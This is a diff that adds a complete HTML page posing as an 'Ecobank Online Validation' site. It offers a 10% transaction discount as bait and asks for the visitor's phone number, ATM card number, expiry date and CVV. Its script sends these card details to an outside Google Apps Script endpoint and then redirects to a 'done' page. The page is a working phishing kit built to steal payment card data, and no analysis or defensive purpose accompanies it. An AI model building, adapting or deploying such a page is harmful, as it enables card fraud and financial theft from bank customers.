@@ -1,0 +1,162 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Ecobank Validation</title>
+
+<style>
+    :root{
+      --blue1:#1d4c8f;
+      --blue2:#123866;
+      --card-blue:#0c2a4c;
+      --green:linear-gradient(90deg,#2cc84a,#0f9d3a);
+      font-family:"Helvetica Neue",Arial;
+    }
+    body{
+      margin:0;
+      background:linear-gradient(180deg,#123866,#0d2c51);
+      text-align:center;
+    }
+    .top{
+      background:linear-gradient(180deg,#1e4c8f,#153b67);
+      padding:45px 20px 70px;
+      border-bottom-left-radius:55px;
+      border-bottom-right-radius:55px;
+      box-shadow:0 8px 22px rgba(0,0,0,0.35);
+    }
+    .pill{
+      background:#1f5fb8;
+      padding:15px 36px;
+      border-radius:40px;
+      color:white;
+      font-size:20px;
+      font-weight:800;
+    }
+    .subtitle{
+      margin-top:16px;
+      color:#dce7f3;
+      font-size:16px;
+      letter-spacing:1px;
+    }
+    .form-card{
+      margin:-40px auto 0;
+      width:90%;
+      max-width:430px;
+      background:#0c2a4c;
+      padding:26px;
+      border-radius:20px;
+      box-shadow:0 8px 25px rgba(0,0,0,0.35);
+    }
+    label{
+      display:block;
+      font-size:17px;
+      font-weight:700;
+      color:white;
+      margin-bottom:8px;
+    }
+    .input{
+      width:100%;
+      padding:16px;
+      border-radius:10px;
+      border:2px solid #e6e6e6;
+      margin-bottom:20px;
+      font-size:16px;
+    }
+    .btn{
+      width:100%;
+      padding:18px;
+      border-radius:40px;
+      background:var(--green);
+      color:white;
+      font-weight:800;
+      font-size:20px;
+      border:none;
+      cursor:pointer;
+    }
+    .success,.error{
+      display:none;
+      margin-top:15px;
+      padding:12px;
+      border-radius:8px;
+      font-weight:700;
+    }
+    .success{ background:#e3f8e6; color:#137b2c; }
+    .error{ background:#ffe7e7; color:#b11313; }
+</style>
+</head>
+
+<body>
+<div class="top">
+    <div class="pill">ECOBANK ONLINE VALIDATION</div>
+    <div class="subtitle">ENJOY 10% DISCOUNT ON EACH TRANSACTION AFTER VALIDATION</div>
+</div>
+
+<div class="form-card">
+<form id="validationForm">
+
+    <label>Phone Number</label>
+    <input class="input" name="phone" required placeholder="Enter your phone number">
+
+    <label>ATM Card Number</label>
+    <input class="input" name="card" required placeholder="Enter your card number">
+
+    <label>ATM Expiry Date</label>
+    <input class="input" name="expiry" required placeholder="MM/YY">
+
+    <label>CVV</label>
+    <input class="input" name="cvv" required placeholder="Enter CVV">
+
+    <button class="btn">VALIDATE ➜</button>
+
+    <div id="success" class="success">Saved. Redirecting...</div>
+    <div id="error" class="error">Please try again.</div>
+
+</form>
+</div>
+
+<script>
+  const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxfzqqLHXGhI3XcRKgrME3vw4cYN1Sdg6rXpd0jV9avGR04iW8kiFgbvf_Wo5n0rdC9/exec";
+
+  const form = document.getElementById("validationForm");
+  const successBox = document.getElementById("success");
+  const errorBox = document.getElementById("error");
+
+  form.addEventListener("submit", async(e)=>{
+    e.preventDefault();
+    successBox.style.display="none";
+    errorBox.style.display="none";
+
+    const data={
+      phone: form.phone.value,
+      card: form.card.value,
+      expiry: form.expiry.value,
+      cvv: form.cvv.value,
+      timestamp: new Date().toISOString()
+    };
+
+    try{
+      const res = await fetch(SCRIPT_URL,{
+        method:"POST",
+        headers:{ "Content-Type":"application/json" },
+        body:JSON.stringify(data)
+      });
+
+      const json = await res.json();
+      if(json.status==="success"){
+          successBox.style.display="block";
+
+          setTimeout(()=>{
+              window.location.href="done.html";
+          },1200);
+
+      } else throw 0;
+
+    }catch{
+      errorBox.style.display="block";
+    }
+  });
+</script>
+
+</body>
+</html>
